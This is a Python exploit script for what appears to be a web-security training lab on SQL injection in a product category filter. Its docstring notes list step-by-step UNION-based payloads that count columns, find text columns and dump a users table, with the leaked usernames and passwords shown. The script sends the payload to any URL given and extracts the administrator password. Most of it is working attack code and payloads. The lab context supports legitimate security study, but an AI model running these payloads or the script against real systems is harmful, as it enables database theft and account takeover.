"""
SQL Injection - Product category filter

End Goal: retrieve all usernames and passwords and login as the administrator user.

Analysis:
--------

(1) Find the number of columns that the vulnerable is using:
' order by 1-- -> not displayed on the page
' order by 2-- -> displayed on the page
' order by 3-- -> internal server error

3 - 1 = 2

(2) Find which columns contain text
' UNION SELECT 'a', NULL--
' UNION SELECT NULL, 'a'-- ->**

(3) Output data from other tables

' UNION select NULL, username from users--
' UNION select NULL, password from users--

' UNION select NULL, version()--
-> PostgreSQL 11.11 (Debian 11.11-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit

' UNION select NULL, username || '*' || password from users--

carlos*hx8lpsrznosr462ydnvh
administrator*35v95vbpktdv4c2nqgak
wiener*0qc4vtnx4o08sr5nsstf

script.py <url> 

"""

import requests 
import sys 
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

def exploit_sqli_users_table(url):
    username = 'administrator'
    path = '/filter?category=Pets'
    sql_payload = "' UNION select NULL, username || '*' || password from users--"
    r = requests.get(url + path + sql_payload, verify=False)
    res = r.text
    if "administrator" in res:
        print("[+] Found the administrator password...")
        soup = BeautifulSoup(r.text, 'html.parser')
        admin_password = soup.find(text=re.compile('.*administrator.*')).split("*")[1]
        print("[+] The administrator password is '%s'." % admin_password)
        return True
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    print("[+] Dumping the list of usernames and passwords...")
    if not exploit_sqli_users_table(url):
        print("[-] Did not find an administrator password.")